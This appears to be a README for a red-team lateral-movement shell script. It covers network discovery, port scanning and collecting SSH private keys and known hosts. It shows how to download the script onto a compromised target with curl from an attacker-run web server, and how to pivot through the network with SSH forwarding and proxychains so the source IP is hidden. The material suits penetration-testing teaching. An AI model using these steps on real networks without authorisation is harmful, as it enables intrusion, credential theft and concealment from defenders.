# Lateral Movement Phase

Lateral Movement is about the ability to move around the network. It is possible that the actual target cannot be reached from or on the initially compromised host. In this case, access must be gained to one or more remote systems. To do this, the network must be explored. Similar to Internal Reconnaissance, information is gathered here, but about the current network and surrounding systems.

This script serves as a tool for receiving some information that may be important for Lateral Movement.

## Features

- Get network neighbours (from arp table)
- Get reachable IP addresses
- Port scan of a given IP address
- Get SSH information about private keys and known hosts

## Usage

From github:
```sh
curl -LJO https://github.com/McSquizzy/red-team-toolbox/blob/main/lateral-movement/lateral-movement.sh
sh lateral-movement.sh -h
```
Local network:
```sh
# Host
sh lateral-movement.sh -w
# Target
curl -LJO <Host>:8000/
sh lateral-movement.sh -h
```

### Parameters

```sh
sh lateral-movement.sh -h

Usage: lateral-movement.sh [options]

Options:
-h               Show this help message
-p <IP address>  Do a port scan of the given IP address

-w               Serves a local web server for transferring files

Output:
-c               No colours. Without colours, the output can probably be read better
-q               Quiet. No banner and no advisory displayed
```

## Results

Results saved to files in current directory and printed to stdout.

## Compatibility

The script uses /bin/sh syntax and is fully POSIX compatible so can run on most unix-based (POSIX/Unix/Linux) systems.

-----

## Additional Information

### Pivoting and Proxychains

Pivoting can be described as a method or technique that allows an already compromised system (also called a "plant" or "foothold") to be used to move into other systems on the same network. This can be used to bypass restrictions on a network (a firewall, for example).

#### Pivoting with SSH

Local forwarding: make a port of the target locally reachable:
````sh
ssh -L <local port>:<remote host>:<remote port> [<jumphost>]
````
Remote forwarding: Make a local port externally accessible:
````sh
ssh -R <remote port>:<localhost>:<local port> [<jumphost>]
````
Dynamic forwarding: Make all ports of the target locally accessible as SOCKS proxy:
````sh
ssh -D <local port> <jump host>
````

#### ProxyChains

Proxychains is a tool that forces any TCP connection of any application through one or more proxy servers (for example SOCKS4/5 or HTTP(S) proxy).  
With proxychains and port forwarding, it is possible to forward a connection through device B to device C.

````sh
# syntax:
proxychains <application> <argument>

# example:
proxychains nmap -sS 10.0.2.16 -p 80
````
The nmap scan is routed through the proxy servers defined in the configuration file.

ProxyChains configuration file: /etc/proxychains.conf
````sh
# syntax:
<typ> <IP> <port> <user> <password>
# examples:
socks4 127.0.0.1 9000
socks5 192.168.89.45 4567 user pass
````

Thus it is possible to disguise the source IP, as the destination will only receive the IP of the last proxy as source.
